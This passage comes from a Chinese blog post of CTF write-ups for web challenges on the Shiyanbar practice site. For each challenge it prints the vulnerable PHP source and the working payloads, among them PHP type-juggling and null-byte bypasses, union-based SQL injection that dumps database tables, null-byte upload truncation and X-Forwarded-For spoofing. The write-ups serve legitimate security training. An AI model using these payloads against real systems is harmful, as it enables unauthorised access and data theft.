+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$data_unserialize = <span class="keyword">array</span>(<span class="string">'user'</span> =&gt; <span class="keyword">True</span>,<span class="string">'pass'</span> =&gt; <span class="keyword">True</span>);</span><br><span class="line">$unserialize_str = serialize($data_unserialize);</span><br><span class="line"><span class="keyword">echo</span> $unserialize_str;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>执行结果</p>
+<p>a:2:{s:4:”user”;b:1;s:4:”pass”;b:1;}</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/28.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>POST后得到flag</p>
+<h3 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h3><p>网址：<a href="http://ctf5.shiyanbar.com/10/upload/step1.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/10/upload/step1.php</a></p>
+<p>一个找回密码的页面，试着源代码看不出提示信息，试着注册一个email</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/29.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>弹框提示了<a href="mailto:./step2.php?email=youmail@mail.com" target="_blank" rel="noopener">./step2.php?email=youmail@mail.com</a>&amp;check=???????</p>
+<p>访问step2.php的源代码，发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;admin&quot; content=&quot;admin@simplexue.com&quot; /&gt;</span><br><span class="line">&lt;meta name=&quot;editor&quot; content=&quot;Vim&quot; /</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;submit.php&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">	&lt;h1&gt;找回密码step2&lt;/h1&gt;</span><br><span class="line">	email:&lt;input name=&quot;emailAddress&quot; type=&quot;text&quot; &lt;br /&gt;</span><br><span class="line">&lt;b&gt;Notice&lt;/b&gt;:  Use of undefined constant email - assumed &apos;email&apos; in &lt;b&gt;C:\h43a1W3\phpstudy\WWW\10\upload\step2.php&lt;/b&gt; on line &lt;b&gt;49&lt;/b&gt;&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Notice&lt;/b&gt;:  Undefined index: email in &lt;b&gt;C:\h43a1W3\phpstudy\WWW\10\upload\step2.php&lt;/b&gt; on line &lt;b&gt;49&lt;/b&gt;&lt;br /&gt;</span><br><span class="line">value=&quot;&quot;  disable=&quot;true&quot;/&gt;&lt;/br&gt;</span><br><span class="line">	token:&lt;input name=&quot;token&quot; type=&quot;text&quot; /&gt;&lt;/br&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+<p>发现这个页面会GET两个参数emailAddress和token到submit.php</p>
+<p>访问submit.php，提示you are not an admin </p>
+<p>在step2.php中我们还发现了该页面可能是通过vim编写的，所以可能存在.submit.php.swp</p>
+<p>访问后得到提示代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">........这一行是省略的代码........</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">如果登录邮箱地址不是管理员则 die()</span></span><br><span class="line"><span class="comment">数据库结构</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- 表的结构 `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CREATE TABLE IF NOT EXISTS `user` (</span></span><br><span class="line"><span class="comment">  `id` int(11) NOT NULL AUTO_INCREMENT,</span></span><br><span class="line"><span class="comment">  `username` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `email` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `token` int(255) NOT NULL DEFAULT '0',</span></span><br><span class="line"><span class="comment">  PRIMARY KEY (`id`)</span></span><br><span class="line"><span class="comment">) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- 转存表中的数据 `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES</span></span><br><span class="line"><span class="comment">(1, '****不可见***', '***不可见***', 0);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">........这一行是省略的代码........</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line">	<span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">	<span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">	$sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>;</span><br><span class="line">	$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>);</span><br><span class="line">	$r = mysql_fetch_assoc($r);</span><br><span class="line">	$r = $r[<span class="string">'num'</span>];</span><br><span class="line">	<span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"失败了呀"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>审计后的思路</p>
+<p>1.需要GET参数token和emailAddress</p>
+<p>2.token值长度为10且必须弱类型等于0</p>
+<p>3.sql语句有查询结果</p>
+<p>首先弱类型相等，且长度为10，那么token可以赋值’0000000000’</p>
+<p>然后emailAddress猜测是在step2.php中的<a href="mailto:admin@simplexue.com" target="_blank" rel="noopener">admin@simplexue.com</a></p>
+<p>得出payload:<a href="mailto:emailAddress=admin@simplexue.com" target="_blank" rel="noopener">emailAddress=admin@simplexue.com</a>&amp;token=0000000000</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/30.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>得到flag</p>
+<h3 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/more.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/more.php</a></p>
+<p>源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">	<span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">8</span> &amp;&amp; $_GET[<span class="string">'password'</span>] &gt; <span class="number">9999999</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'*-*'</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span>(<span class="string">'&lt;p&gt;*-* have not been found&lt;/p&gt;'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password&lt;/p&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>审计源代码，获得flag需要绕过3个检测：</p>
+<p>1.符合ereg正则匹配，用%00绕过即可</p>
+<p>2.password长度小于8但是值大于9999999，用科学计数法即可绕过</p>
+<p>3.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">最后payload:</span><br></pre></td></tr></table></figure></p>
+<p>password=1e8%00<em>-</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### Guess Next Session</span><br><span class="line"></span><br><span class="line">网址：http://ctf5.shiyanbar.com/web/Session.php</span><br><span class="line"></span><br><span class="line">源代码：</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">session_start(); </span><br><span class="line">if (isset ($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">    if ($_GET[&apos;password&apos;] == $_SESSION[&apos;password&apos;])</span><br><span class="line">        die (&apos;Flag: &apos;.$flag);</span><br><span class="line">    else</span><br><span class="line">        print &apos;&lt;p&gt;Wrong guess.&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>审计得flag思路：GET的参数password必须等于SESSION[‘password’]，我们知道session是存储在服务器上，但是在本地存在一个cookie字段：session_id</p>
+<p>我们可以将cookie字段的session_id删除，然后get的参数password为空，即可让二者相等</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/31.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h3 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/false.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/false.php</a></p>
+<p>源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Your password can not be your name!&lt;/p&gt;'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password.&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;p&gt;Login first!&lt;/p&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得到flag思路：GET的参数name和password不相等但是sha1加密后相等</p>
+<p>查询得知sha1函数只能处理字符串类型，处理数组则返回FALSE，那么可以构造payload:</p>
+<p>name[]=a&amp;password[]=b</p>
+<p>a和b只要不相等就能得到flag</p>
+<h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/upload/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/upload/</a></p>
+<p>bp截取包修改文件类型无效，修改为png文件提示必须上传php文件</p>
+<p>尝试0x00截断</p>
+<p>在上传路径/uploads/下添加demo.php+</p>
+<p>并将+在十六进制中的2b替换成00</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/32.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/33.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>获取flag</p>
+<h3 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/web200.jpg" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/web200.jpg</a></p>
+<p>给出加密函数，要求我们编写解密函数</p>
+<p>代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function decode($key)&#123;</span><br><span class="line">	$_ = base64_decode(strrev(str_rot13($key)));</span><br><span class="line">	$_o = &apos;&apos;;</span><br><span class="line">	for($_0=0;$_0&lt;strlen($_);$_0++)&#123;</span><br><span class="line">		$c = substr($_,$_0,1);</span><br><span class="line">		$__ = chr(ord($c)-1);</span><br><span class="line">		$_o = $_o.$__;</span><br><span class="line">	&#125;</span><br><span class="line">	$str = strrev($_o);</span><br><span class="line">	return $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key = &apos;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&apos;;</span><br><span class="line">echo decode($key);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>运行结果：flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}</p>
+<h3 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/5/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/5/index.php</a></p>
+<p>源代码提示文件index.txt，访问得源代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if($_POST[&apos;user&apos;] &amp;&amp; $_POST[&apos;pass&apos;]) &#123;</span><br><span class="line">	$conn = mysql_connect(&quot;********&quot;, &quot;*****&quot;, &quot;********&quot;);</span><br><span class="line">	mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);</span><br><span class="line">	if ($conn-&gt;connect_error)&#123;</span><br><span class="line">		die(&quot;Connection failed: &quot; . mysql_error($conn));</span><br><span class="line">	&#125; </span><br><span class="line">	$user = $_POST[&apos;user&apos;];</span><br><span class="line">	$pass = md5($_POST[&apos;pass&apos;]);</span><br><span class="line"></span><br><span class="line">	$sql = &quot;select pw from php where user=&apos;$user&apos;&quot;;</span><br><span class="line">	$query = mysql_query($sql);</span><br><span class="line">	if (!$query) &#123;</span><br><span class="line">		printf(&quot;Error: %s\n&quot;, mysql_error($conn));</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line">	//echo $row[&quot;pw&quot;];</span><br><span class="line">  </span><br><span class="line">	if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class="line">		echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">    	echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</span><br><span class="line">	&#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>对参数$user不存在过滤，可以进行sql注入，进而控制查询结果的pw列的数据</p>
+<p>因为$pass是我们POST的参数pass经过md5加密后得到的值</p>
+<p>所以构造payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&apos; union select md5(&apos;1&apos;)#&amp;pass=1</span><br></pre></td></tr></table></figure>
+<p>得到flag:SimCTF{youhaocongming} </p>
+<h3 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h3><p>网址：<a href="http://ctf5.shiyanbar.com/DUTCTF/1.html" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/DUTCTF/1.html</a></p>
+<p>页面显示一段jsfuck代码</p>
+<p>直接放到浏览器控制台运行</p>
+<p>弹出密码：Ihatejs</p>
+<p>尝试即为flag</p>
+<h3 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h3><p>网址：<a href="http://ctf5.shiyanbar.com/DUTCTF/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/DUTCTF/index.php</a></p>
+<p>源代码给出提示文件index.php.txt </p>
+<p>访问得源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>考察url二次编码，将hackerDJ进行二次url编码后作为参数id值，浏览器首先会对id值进行一次url解码，之后绕过eregi检测后再对一次解码后的值进行二次解码，解码后得hackerDJ</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%2568%2561%2563%256b%2565%2572%2544%254a</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/34.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h3 id="这个看起来有点简单"><a href="#这个看起来有点简单" class="headerlink" title="这个看起来有点简单!"></a>这个看起来有点简单!</h3><p>网址：<a href="http://ctf5.shiyanbar.com/8/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php</a></p>
+<p>输入1’,1”都报错，输入1%23返回正确信息</p>
+<p>说明id未被引号包裹</p>
+<p>进行sql注入：</p>
+<p>注数据库payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%20union%20select%201,database()%23</span><br></pre></td></tr></table></figure>
+<p>数据库名：my_db </p>
+<p>注数据表payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23</span><br></pre></td></tr></table></figure>
+<p>数据表名：news,thiskey </p>
+<p>注数据列payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%20union%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27thiskey%27%23</span><br></pre></td></tr></table></figure>
+<p>列名：k0y </p>
+<p>注数据payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%20union%20select%201,k0y%20from%20thiskey%23</span><br></pre></td></tr></table></figure>
+<p>flag: whatiMyD91dump </p>
+<h3 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h3><p>网址：<a href="http://ctf5.shiyanbar.com/phpaudit/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/phpaudit/</a></p>
+<p>源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetIP</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>]))</span><br><span class="line">	$cip = $_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>];</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>]))</span><br><span class="line">	$cip = $_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>];</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]))</span><br><span class="line">	$cip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	$cip = <span class="string">"0.0.0.0"</span>;</span><br><span class="line"><span class="keyword">return</span> $cip;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$GetIPs = GetIP();</span><br><span class="line"><span class="keyword">if</span> ($GetIPs==<span class="string">"1.1.1.1"</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Great! Key is *********"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"错误！你的IP不在访问列表之内！"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>burp抓包添加X-Forwarded-For:1.1.1.1即可获得flag:SimCTF{daima_shengji}</p>
+<h3 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h3><p>网址：<a href="http://ctf5.shiyanbar.com/sHeader/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/sHeader/</a></p>
+<p>页面给了提示http header</p>
+<p>Please make sure you have installed .net framework 9.9!</p>
+<p>Make sure you are in the region of England and browsing this site with Internet Explorer</p>
+<p>思路就是修改http请求头部的User-Agent字段和Accept-Language字段</p>
+<p>第一个是安装.net9.9框架  第二个是保证在英国地区 第三个是用ie浏览器 </p>
+<p>第一个和第三个我们可以在User-Agent后加上(MSIE 9.0;.NET CLR 9.9)来实现</p>
+<p>最后一个在英国我们把语言改成en-gb即可</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/35.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h3 id="猫抓老鼠"><a href="#猫抓老鼠" class="headerlink" title="猫抓老鼠"></a>猫抓老鼠</h3><p>网址：<a href="http://ctf5.shiyanbar.com/basic/catch/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/basic/catch/</a></p>
+<p>提示catch，bp抓包发现响应头部字段Content-Row: MTUzNzAzMDU2OA==</p>
+<p>经过base64解密后1537030568</p>
+<p>作为pass_key提交无果，直接提交pass_key=MTUzNzAzMDU2OA==得到flag</p>
+<p>KEY: #WWWnsf0cus_NET#</p>
+<h3 id="看起来有点难"><a href="#看起来有点难" class="headerlink" title="看起来有点难"></a>看起来有点难</h3><p>网址：<a href="http://ctf5.shiyanbar.com/basic/inject/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/basic/inject/index.php</a></p>
+<p>注入点在admin,使用基于时间的盲注，脚本略</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2018-09-17T12:35:12.755Z" itemprop="dateUpdated">2018-09-17 20:35:12</time>
+</span>
+
+
+        
